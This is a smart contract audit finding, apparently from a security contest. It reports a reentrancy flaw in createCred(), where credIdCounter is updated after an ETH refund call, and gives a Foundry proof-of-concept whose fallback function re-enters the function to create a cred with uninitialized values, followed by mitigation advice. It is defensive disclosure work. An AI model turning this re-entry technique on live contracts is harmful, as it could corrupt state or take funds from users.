# Vulnerability details

## Impact
createCred() function update credIdCounter after external call result any sender with malicious intent can create cred with Uninitialized value.

## Proof of Concept
createCred() function internally call _createCredInternal() function which update creds mapping for the credID and then buy 1 amount of share for that credID and lastly it updates the credIdCounter. Because credIdCounter is updated after the buy share call a malicious sender can re-enter into createCred() function call with same values as first call an it will create cred which values will be uninitialized. The re-entrant call is possible because the buy cred share amount call will return any excess eth to the caller.

Here is foundry test cases to create a cred with Uninitialized value.

Save this code into Cred.t.sol file and run `forge test --mt test_Create_Cred_With_Zero_Values -vvv`:
```
bytes CreateData;
    bytes32 r;
    bytes32 s;
    uint x;

    function test_Create_Cred_With_Zero_Values() external {
        vm.warp(START_TIME + 1);
        vm.startPrank(participant);
        uint256 credId = 1;
        uint256 supply = 0;
        uint256 amount = 1;
        uint256 expiresIn = START_TIME + 100;
        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(credId, supply, amount);
        string memory credURL = "test";
        bytes memory signCreateData = abi.encode(
            expiresIn, address(this), 31_337, address(bondingCurve), credURL, "BASIC", "SIGNATURE", 0x0
        );
        CreateData = signCreateData;
        bytes32 createMsgHash = keccak256(signCreateData);
        bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
        (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
        r = cr;
        s = cs;
        if (cv != 27) cs = cs | bytes32(uint256(1) << 255);
        vm.stopPrank();
        cred.createCred{ value: buyPrice * 4 }(participant, signCreateData, abi.encodePacked(cr, cs), 100, 100);
        console2.log("credID:", cred.credIdCounter());
        console2.log("credID 1 creater address", cred.getCredCreator(1));
    }

    fallback() external payable {
        if ( x == 0) {
            x = 1;
            cred.createCred{ value: msg.value }(participant, CreateData, abi.encodePacked(r, s), 100, 100);
            console2.log("credID:", cred.credIdCounter());
            console2.log("credID 2 creater address:",cred.getCredCreator(2));
        }
    }
```

## Tools Used
Foundry

## Recommended Mitigation Steps
Update the credIdCounter before the buyShareCred() function call and also add non-reentrant modifier into the buyShareCred() function.


## Assessed type

Reentrancy
